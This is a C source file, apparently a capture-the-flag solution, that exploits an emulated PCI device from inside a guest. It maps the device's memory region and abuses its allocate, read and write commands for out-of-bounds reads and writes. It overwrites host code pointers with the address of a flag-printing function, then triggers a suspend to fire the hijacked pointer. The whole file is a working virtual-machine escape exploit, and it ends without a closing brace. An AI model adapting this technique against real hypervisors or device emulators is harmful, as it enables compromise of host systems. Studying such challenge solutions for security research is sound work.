#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include <sys/mman.h>

static const char *path = "/sys/devices/pci0000:00/0000:00:04.0/resource0";

#define TEXT_START 0x400000
#define TEXT_END 0xA34DC0

#define CATFLAG_FUNCTION 0x6E65F9

static void do_malloc(void *ptr, int index, int n) {
  uintptr_t addr = 0;
  addr |= 0 << 20;
  addr |= index << 16;
  addr += (uintptr_t)ptr;

  volatile uint32_t *a = (uint32_t *)addr;
  *a = n;
}

static void do_free(void *ptr, int index) {
  uintptr_t addr = 0;
  addr |= 1 << 20;
  addr |= index << 16;
  addr += (uintptr_t)ptr;

  volatile uint32_t *a = (uint32_t *)addr;
  *a = 0;
}

static void do_write(void *ptr, int index, int16_t offset, uint32_t value) {
  uintptr_t addr = 0;
  addr |= 2 << 20;
  addr |= index << 16;
  addr |= offset & 0xFFFF;
  addr += (uintptr_t)ptr;

  volatile uint32_t *a = (uint32_t *)addr;
  *a = value;
}

static void do_write64(void *ptr, int index, int16_t offset, uint64_t value) {
  do_write(ptr, index, offset, value);
  do_write(ptr, index, offset + 4, value >> 32);
}

static uint32_t do_read(void *ptr, int index, int16_t offset) {
  uintptr_t addr = 0;
  addr |= index << 16;
  addr |= offset & 0xFFFF;
  addr += (uintptr_t)ptr;

  volatile uint32_t *a = (uint32_t *)addr;
  return *a;
}

static uint64_t do_read64(void *ptr, int index, int16_t offset) {
  return do_read(ptr, index, offset) |
         ((uint64_t)do_read(ptr, index, offset + 4) << 32);
}

int main(int argc, char **argv) {
  int fd = open(path, O_RDWR | O_SYNC);
  if (fd < 0) {
    perror("open");
    return 1;
  }
  void *ptr = mmap((void *)0x700000000000ULL, 0x1000000, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, 0);
  if (ptr == NULL) {
    perror("mmap");
    return 1;
  }
  printf("mmaped at %p\n", ptr);

  for (int n = 1; n < 0x10000; n *= 2) {
    do_malloc(ptr, 0, n);
    for (int i = -32768; i < 32768; i += 8) {
      uint64_t val = do_read64(ptr, 0, i);
      if (val >= TEXT_START && val <= TEXT_END) {
        do_write64(ptr, 0, i, CATFLAG_FUNCTION);
        printf("%d (%x): %" PRIx64 " -> %" PRIx64 "\n", i, (unsigned)i, val,
               do_read64(ptr, 0, i));
      }
    }
    do_free(ptr, 0);
  }

  system("echo mem > /sys/power/state");

